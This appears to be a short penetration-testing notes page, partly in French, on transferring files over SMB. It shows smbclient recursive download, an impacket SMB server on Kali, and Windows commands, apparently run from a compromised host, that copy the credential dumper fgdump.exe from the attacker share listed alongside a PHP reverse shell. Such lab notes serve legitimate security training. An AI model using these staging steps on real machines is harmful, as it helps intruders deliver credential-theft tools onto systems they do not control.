# Transferring files via SMB

https://blog.ropnop.com/transferring-files-from-kali-to-windows/
https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient


## SMB client

recursive transfert :

```
smbclient '\\server\share'
    mask ""
    recurse ON
    prompt OFF
    cd 'path\to\remote\dir'
    lcd '~/path/to/download/to/'
    mget *
```

## smb impacket

Lancer un serveur smb sur kali :

```
root@kali:/var/www/html# impacket-smbserver kalishare /var/www/html
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Sur la machine windows :

```
C:\Users\winuser\Downloads\os-384996>net view 10.10.10.7
net view 10.10.10.7
Shared resources at 10.10.10.7

(null)

Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
KALISHARE   Disk                    
The command completed successfully.


C:\Users\winuser\Downloads\os-384996>dir \\10.10.10.7\KALISHARE
dir \\10.10.10.7\KALISHARE
 Volume in drive \\10.10.10.7\KALISHARE has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of \\10.10.10.7\KALISHARE

10/30/2018  02:16 PM    <DIR>          .
09/20/2017  04:57 AM    <DIR>          ..
09/09/2018  05:24 AM           576,230 ext4
08/01/2018  04:58 AM           974,848 fgdump.exe.txt
06/04/2018  09:15 PM         3,248,615 OpenSSH-Win64.zip
07/07/2018  06:46 AM             6,609 8.c
09/08/2018  11:46 AM             5,491 php-reverse-shell.php
08/01/2018  04:58 AM            49,152 fgexec.exe

...

              90 File(s)     95,297,537 bytes
               8 Dir(s)  15,207,469,056 bytes free

```


Copy is very simple :

```
C:\Users\winuser\Downloads\os-384996>copy \\10.10.10.7\KALISHARE\fgdump.exe .
copy \\10.10.10.7\KALISHARE\fgdump.exe .
        1 file(s) copied.

C:\Users\winuser\Downloads\os-384996>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F87E-3A28

 Directory of C:\Users\winuser\Downloads\os-384996

12/27/2013  11:37 PM    <DIR>          .
12/27/2013  11:37 PM    <DIR>          ..
09/08/2018  06:46 AM           974,848 fgdump.exe
12/27/2013  11:37 PM                21 wget.ps1
12/27/2013  11:37 PM                79 wget.ps1type
               3 File(s)        974,948 bytes
               2 Dir(s)   4,700,663,808 bytes free

```

And we can make the same for download/upload.
